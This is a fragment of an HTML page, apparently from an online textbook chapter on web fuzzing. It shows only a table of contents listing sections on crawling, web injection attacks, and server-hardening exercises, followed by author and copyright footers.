<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#crawling-user-interfaces">Crawling User Interfaces</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#excursion-implementing-a-crawler">Excursion: Implementing a Crawler</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#id2">End of Excursion</a></li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#crafting-web-attacks">Crafting Web Attacks</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#html-injection-attacks">HTML Injection Attacks</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#cross-site-scripting-attacks">Cross-Site Scripting Attacks</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#id3">SQL Injection Attacks</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#leaking-internal-information">Leaking Internal Information</a></li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#fully-automatic-web-attacks">Fully Automatic Web Attacks</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#lessons-learned">Lessons Learned</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#next-steps">Next Steps</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#background">Background</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#exercises">Exercises</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#exercise-1-fix-the-server">Exercise 1: Fix the Server</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#part-1-silent-failures">Part 1: Silent Failures</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#part-2-sanitized-html">Part 2: Sanitized HTML</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#part-3-sanitized-sql">Part 3: Sanitized SQL</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#part-4-a-robust-server">Part 4: A Robust Server</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#part-5-test-it">Part 5: Test it!</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#exercise-2-protect-the-server">Exercise 2: Protect the Server</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#part-1-a-blacklisting-filter">Part 1: A Blacklisting Filter</a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#part-2-a-whitelisting-filter">Part 2: A Whitelisting Filter</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#exercise-3-input-patterns">Exercise 3: Input Patterns</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#exercise-4-coverage-driven-web-fuzzing">Exercise 4: Coverage-Driven Web Fuzzing</a></li>
</ul>
</li>
</ul>
  </nav></div>

</div></div>
              
            
          </div>
          <footer class="bd-footer-content">
            
<div class="bd-footer-content__inner container">
  
  <div class="footer-item">
    
<p class="component-author">
By Andreas Zeller, Rahul Gopinath, Marcel Böhme, Gordon Fraser, and Christian Holler
</p>

  </div>
  
  <div class="footer-item">
    

  </div>
  
  <div class="footer-item">
    
  </div>
  
  <div class="footer-item">
    
<div class="extra_footer">
  <div>
  Copyright &copy; 2021–2025 <a href="https://www.cispa.de/">CISPA Helmholtz Center for Information Security</a>. Copyright &copy; 2018-2020 <a href="https://www.uni-saarland.de/">Saarland University</a>. Copyright &copy; 2018-2025 external contributors.
  The <strong>content</strong> of this project is licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.
  The <strong>source code</strong> that is part of the content, as well as the source code used to format and display that content is licensed under the <a href="https://github.com/uds-se/fuzzingbook/blob/master/LICENSE.md#mit-license">MIT License</a>.
  <br>
  <a href="https://cispa.de/en/impressum">Imprint</a> &middot; <a href="/html/index.html#how-do-i-cite-your-work">Cite</a>
</div>

</div>
  </div>
  
</div>
          </footer>
        

      </main>
    </div>
  </div>
  
  <!-- Scripts loaded after <body> so the DOM is not blocked -->
  <script src="_static/scripts/bootstrap.js?digest=dfe6caa3a7d634c4db9b"></script>
<script src="_static/scripts/pydata-sphinx-theme.js?digest=dfe6caa3a7d634c4db9b"></script>

  <footer class="bd-footer">
  </footer>
  </body>
</html>